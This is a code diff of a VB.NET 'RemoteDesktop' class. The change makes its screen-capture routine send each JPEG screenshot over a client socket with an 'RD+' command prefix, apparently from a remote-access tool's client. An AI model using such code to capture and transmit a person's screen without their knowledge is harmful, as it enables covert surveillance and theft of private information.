@@ -11,16 +11,16 @@ Imports System.Windows.Forms
 
 Public Class RemoteDesktop
 
-    Public Shared Function Capture(ByVal W As Integer, ByVal H As Integer) As Byte()
+    Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
 
         Dim ScreenSize As Size = New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
         Dim screenGrab As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-        Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenGrab)
+        Dim g As Graphics = Graphics.FromImage(screenGrab)
         g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
 
-        Dim Temp As New Drawing.Bitmap(W, H)
-        Dim G2 As Drawing.Graphics = Drawing.Graphics.FromImage(Temp)
-        G2.DrawImage(screenGrab, New Drawing.Rectangle(0, 0, W, H), New Drawing.Rectangle(0, 0, ScreenSize.Width, ScreenSize.Height), Drawing.GraphicsUnit.Pixel)
+        Dim Temp As New Bitmap(W, H)
+        Dim G2 As Graphics = Graphics.FromImage(Temp)
+        G2.DrawImage(screenGrab, New Rectangle(0, 0, W, H), New Drawing.Rectangle(0, 0, ScreenSize.Width, ScreenSize.Height), GraphicsUnit.Pixel)
 
         Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 40)
         Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
@@ -37,8 +37,14 @@ Public Class RemoteDesktop
         Catch ex As Exception
         End Try
 
-        Return MS.ToArray
-    End Function
+        ClientSocket.Send("RD+" + ClientSocket.SPL + BS(MS.GetBuffer))
+
+        Try
+            MS.Dispose()
+        Catch ex As Exception
+        End Try
+
+    End Sub
 
 
 
